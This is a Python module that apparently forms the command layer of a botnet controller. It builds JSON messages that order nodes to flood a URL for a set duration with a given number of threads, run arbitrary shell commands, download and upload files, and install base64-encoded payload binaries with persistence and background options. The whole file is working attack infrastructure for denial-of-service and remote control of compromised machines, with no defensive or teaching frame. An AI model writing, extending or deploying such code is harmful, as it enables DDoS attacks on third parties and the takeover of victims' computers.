import json
import base64
import shutil
import os
from pathlib import Path
from colorama import Fore, Style

PAYLOADS_DIR = Path("data/payloads")
INDEX_FILE = PAYLOADS_DIR / "index.json"


def _load_index():
    if not INDEX_FILE.exists():
        return {}
    try:
        with INDEX_FILE.open("r") as f:
            return json.load(f)
    except (json.JSONDecodeError, OSError):
        return {}


def _save_index(index):
    PAYLOADS_DIR.mkdir(parents=True, exist_ok=True)
    with INDEX_FILE.open("w") as f:
        json.dump(index, f, indent=2)


class Payloads:
    @staticmethod
    def flood(url, duration, method, threads):
        return json.dumps(
            {
                "action": "flood",
                "data": {
                    "url": url,
                    "duration": duration,
                    "method": method,
                    "threads": threads,
                },
            }
        )

    @staticmethod
    def ping():
        return json.dumps({"action": "ping"})

    @staticmethod
    def sync_nodes():
        try:
            nodes_file = Path("data/nodes.json")
            if not nodes_file.exists():
                raise FileNotFoundError("nodes.json not found")
            with nodes_file.open("r") as f:
                nodes = json.load(f)
            data = [f"{node[0]}:{node[1]}" for node in nodes]
            return json.dumps({"action": "sync_nodes", "data": data})
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"{Fore.RED}Error: Failed to load nodes.json: {e}{Style.RESET_ALL}")
            return json.dumps({"action": "sync_nodes", "data": []})

    @staticmethod
    def status():
        return json.dumps({"action": "status"})

    @staticmethod
    def get_clients():
        return json.dumps({"action": "get_clients"})

    @staticmethod
    def disconnect_client(client_id):
        return json.dumps(
            {"action": "disconnect_client", "data": {"client_id": client_id}}
        )

    @staticmethod
    def exec_command(target, command):
        return json.dumps({
            "action": "exec",
            "target": target,
            "expect_response": True,
            "data": {"command": command},
        })

    @staticmethod
    def download(target, path):
        return json.dumps({
            "action": "download",
            "target": target,
            "expect_response": True,
            "data": {"path": path},
        })

    @staticmethod
    def upload(target, path, content_b64):
        return json.dumps({
            "action": "upload",
            "target": target,
            "expect_response": True,
            "data": {"path": path, "content_b64": content_b64},
        })

    @staticmethod
    def execute_payload(name, target, args_override=None, timeout_override=None, persist_override=None):
        index = _load_index()
        if name not in index:
            raise ValueError(f"Payload '{name}' not found in index")
        entry = index[name]
        file_path = PAYLOADS_DIR / entry["file"]
        if not file_path.exists():
            raise FileNotFoundError(f"Payload file '{file_path}' not found")
        with file_path.open("rb") as f:
            content_b64 = base64.b64encode(f.read()).decode()
        timeout = timeout_override if timeout_override is not None else entry.get("timeout", 120)
        persist = persist_override if persist_override is not None else entry.get("persist", False)
        args = args_override if args_override is not None else entry.get("args", [])
        payload_type = entry.get("type", "bin")
        filename = entry.get("file", "payload")
        background = entry.get("background", False)
        return json.dumps({
            "action": "payload",
            "target": target,
            "expect_response": True,
            "data": {
                "content_b64": content_b64,
                "filename": filename,
                "type": payload_type,
                "timeout": timeout,
                "persist": persist,
                "args": args,
                "background": background,
            },
        })


